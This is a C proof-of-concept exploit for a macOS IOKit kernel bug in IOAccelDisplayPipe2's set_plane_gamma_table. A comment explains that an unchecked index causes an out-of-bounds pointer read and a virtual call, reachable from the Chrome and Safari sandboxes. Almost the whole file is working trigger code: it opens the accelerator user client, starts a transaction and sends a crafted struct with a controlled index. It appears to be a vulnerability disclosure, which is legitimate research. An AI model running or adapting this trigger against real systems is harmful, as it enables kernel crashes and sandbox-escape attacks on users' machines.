/*
clang -o gamma gamma.c -framework IOKit

IOAccelDisplayPipe2::transaction_set_plane_gamma_table fails to verify the second dword of IOAccelDisplayPipeGammaTableArgs
which can be controlled by calling the external method with selector 5 of IOAccelDisplayPipeUserClient2.

This unchecked dword is passed to IOAccelDisplayPipeTransaction2::set_plane_gamma_table where it is used as an index
to read a pointer to a c++ object from an array. By specifying a large index this will read a c++ object pointer out-of-bounds.
The code then calls a virtual function on this object.

Impact:
This userclient can be instantiated in the chrome GPU process sandbox and the safari renderer sandbox.

tested on: MacBookAir5,2 w/ 10.9.3/13d64
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOAccelerator");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);


  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 4, &conn); // IOAccelDisplayPipeUserClient2
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return 0;
  }else{
    printf("got userclient connection: %x, type:%d\n", conn, 4);
  }
  
  printf("got userclient connection: %x\n", conn);

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;


  // call set_pipe_index:
  // IOAccelDisplayPipeUserClient2 + 0xe8 is a pointer to the display pipe,
  // this external method initializes that pointer
    
  inputScalar[0] = 0;
  inputScalarCnt = 1;
  err = IOConnectCallMethod(
    conn,
    0x0,
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("set_pipe begin failed: IOConnectCall error: %x\n", err);
    return 0;
  }

  inputScalarCnt = 0;
  inputStructCnt = 0;
  outputScalarCnt = 0;
  outputStructCnt = 0;

  // call transaction_begin:
  // IOAccelDisplayPipeUserClient2 + 0x181 determines whether the userclient is in a transaction,
  // have to be in a transaction to reach the bug

  outputScalar[0] = 0;
  outputScalarCnt = 1;
  err = IOConnectCallMethod(
    conn,
    0x4,
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("transaction begin failed: IOConnectCall error: %x\n", err);
    return 0;
  }

  // that returned something like a transaction id?

  printf("transaction begin returned: 0x%08x\n", outputScalar[0]);
  uint32_t transaction_id = outputScalar[0];

  inputScalarCnt = 0;
  inputStructCnt = 0;
  outputScalarCnt = 0;
  outputStructCnt = 0;

  // set up the struct of fake gamma tables:
  uint32_t *g = (uint32_t*)inputStruct;
  memset(g, 0, 0x28);
  g[0] = transaction_id; // transation id from transaction_begin
  g[1] = 0x12345678;     // this field is unchecked
  g[2] = 1;              // number of gamma tables??
  g[3] = 0x50000000;

  inputStructCnt = 0x28;

  outputScalarCnt = 0;
  outputStructCnt = 0;

  // call set_plane_gamma_table

  err = IOConnectCallMethod(
    conn,
    0x5,
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error: %x\n", err);
    return 0;
  }

  printf("win?\n");

  return 0;
}
